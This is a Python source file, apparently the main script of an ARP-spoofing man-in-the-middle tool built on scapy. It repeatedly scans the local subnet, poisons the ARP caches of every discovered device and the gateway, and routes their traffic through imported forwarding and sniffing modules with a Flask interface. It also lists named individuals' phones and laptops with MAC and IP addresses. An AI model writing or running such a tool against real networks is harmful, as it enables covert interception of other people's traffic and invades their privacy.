from scapy.all import *
from spoofer import *
from sniffer import *
from app import run as run_flask, set_devices
import threading
import time

devices_lock = threading.Lock()

#Configuration variables
conf.iface = "Intel(R) Ethernet Connection (12) I219-V"
gateway_ip = "192.168.10.1"


ip_to_mac = {}
devices = {
    "28:d0:43:c7:bf:6c": {"name": "Guy", "device": "Laptop", "ip" : "192.168.10.133"},
    "72:26:6a:4f:52:1a": {"name": "Guy", "device": "iPhone", "ip" : "192.168.10.218"},
}


# devices = {
#     "58:ef:68:b4:ea:49": {"name": "Home TV", "device": "TV", "ip" : "10.100.102.12"},
#     "bc:9f:58:84:93:63": {"name": "Maya", "device": "iPhone", "ip" : "10.100.102.81"},
#     "bc:07:1d:cc:f1:69": {"name": "Lior", "device": "Google Pixel", "ip" : "10.100.102.76"},
#     "02:32:b8:8b:2c:b4": {"name": "Tali", "device": "iPhone", "ip" : "10.100.102.77"}
# }

blacklisted = {
    "58:ef:68:b4:ea:49"
}


def get_all_network_devices(my_mac, gateway_mac, ip_to_mac):
    first = True
    while True:
        if not first:
            time.sleep(30)
        first = False

        print("Getting all network devices...")
        answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=".".join(gateway_ip.split(".")[:3]) + ".0/24"), timeout=2, verbose=0)
        for _, received in answered:
            mac = received.hwsrc
            ip = received.psrc
            if mac == my_mac or mac == gateway_mac:
                continue
            with devices_lock:
                if mac not in devices:
                    print(f"Adding device {ip} ({mac})...")
                    devices[mac] = {"name": "Unknown", "device": mac, "ip": ip}
                    ip_to_mac[ip] = mac
                elif devices[mac]["ip"] != ip:
                    old_ip = devices[mac]["ip"]
                    devices[mac]["ip"] = ip
                    ip_to_mac[ip] = mac
                    ip_to_mac.pop(old_ip)


def main():
    my_mac = get_if_hwaddr(conf.iface)
    gateway_mac = get_mac(gateway_ip)

    ip_to_mac = {info["ip"]: mac for mac, info in devices.items()}

    scan_thread = threading.Thread(target=get_all_network_devices, args=(my_mac, gateway_mac, ip_to_mac))
    scan_thread.daemon = True
    scan_thread.start()


    print(f"My MAC:      {my_mac}")
    print(f"Gateway MAC: {gateway_mac}")

    try:
        set_devices(devices)
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()

        forwarding_thread = threading.Thread(target=start_forwarding, args=(devices, ip_to_mac, gateway_mac, my_mac, blacklisted))
        forwarding_thread.daemon = True
        forwarding_thread.start()
        while True:
            with devices_lock:
                targets = list(devices.items())
            for mac, info in targets:
                if mac not in blacklisted:
                    spoof(info["ip"], gateway_ip, mac, my_mac)
                    spoof(gateway_ip, info["ip"], gateway_mac, my_mac)
            time.sleep(8)
    except KeyboardInterrupt:
        for mac, info in devices.items():
            restore_arp(info["ip"], mac, gateway_ip, gateway_mac)
        print("\nStopping.")

if __name__ == "__main__":
    main()
